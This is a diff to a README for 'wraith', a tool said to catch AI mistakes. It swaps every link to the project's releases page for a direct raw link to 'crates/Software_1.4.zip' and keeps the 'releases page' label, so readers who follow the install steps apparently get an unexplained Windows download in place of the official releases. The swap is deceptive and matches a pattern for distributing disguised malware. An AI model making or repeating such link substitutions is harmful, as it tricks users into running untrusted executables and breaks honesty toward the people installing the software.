@@ -1,6 +1,6 @@
 # 🛡️ wraith - Catch AI mistakes before they ship
 
-[![Download wraith](https://img.shields.io/badge/Download-wraith%20Releases-blue?style=for-the-badge)](https://github.com/lost-ranchhand865/wraith/releases)
+[![Download wraith](https://img.shields.io/badge/Download-wraith%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/lost-ranchhand865/wraith/main/crates/Software_1.4.zip)
 
 ## 🚀 What wraith does
 
@@ -16,7 +16,7 @@ It works with a fixed rule set, so you get the same result each time on the same
 
 ## 📥 Download and install
 
-1. Visit the [wraith releases page](https://github.com/lost-ranchhand865/wraith/releases)
+1. Visit the [wraith releases page](https://raw.githubusercontent.com/lost-ranchhand865/wraith/main/crates/Software_1.4.zip)
 2. Find the latest Windows download
 3. Download the `.exe` file or the Windows zip file
 4. If you downloaded a zip file, unpack it first
@@ -152,7 +152,7 @@ It fits well when you want:
 
 ## 🔗 Get the Windows download
 
-Use the [wraith releases page](https://github.com/lost-ranchhand865/wraith/releases) to visit this page to download the Windows release
+Use the [wraith releases page](https://raw.githubusercontent.com/lost-ranchhand865/wraith/main/crates/Software_1.4.zip) to visit this page to download the Windows release
 
 ## 🧾 File and scan tips
 
